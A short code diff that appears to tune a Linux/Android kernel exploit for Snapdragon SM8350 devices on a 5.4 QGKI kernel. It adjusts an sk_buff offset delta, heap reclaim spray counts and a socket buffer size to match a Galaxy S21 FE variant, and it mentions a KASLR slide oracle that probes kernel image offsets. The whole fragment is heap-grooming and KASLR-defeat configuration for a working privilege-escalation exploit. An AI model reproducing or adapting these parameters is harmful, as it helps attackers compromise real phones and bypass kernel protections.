@@ -81,10 +81,11 @@
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 #endif
 
-#define SKB_DATA_DELTA (-0xe80LL)
+#define SKB_DATA_DELTA (-0x1000LL)   /* SM8350 5.4 QGKI: matches r12s (Galaxy S21 FE US) */
 #define SKB_SEND_SIZE 0x8e80
-#define SKB_RECLAIM_SENDS 128          /* SM8350: more reclaim sends for reliable sk_buff placement */
-#define APP_SLIDE_RECLAIM_SENDS 128
+#define SKB_RECLAIM_SENDS 192          /* SM8350: matches r12s APP_SLIDE_RECLAIM_SENDS */
+#define APP_SLIDE_RECLAIM_SENDS 192
+#define APP_SLIDE_RECLAIM_SNDBUF 16777216 /* 16 MB: matches r12s */
 #define PIPE_MAX_ATTEMPTS 20           /* increase to compensate for DMA32 skip failures */
 
 // KASLR slide oracle — 32 slots of 64KB, probe at Image[0x1f0000 - slide]
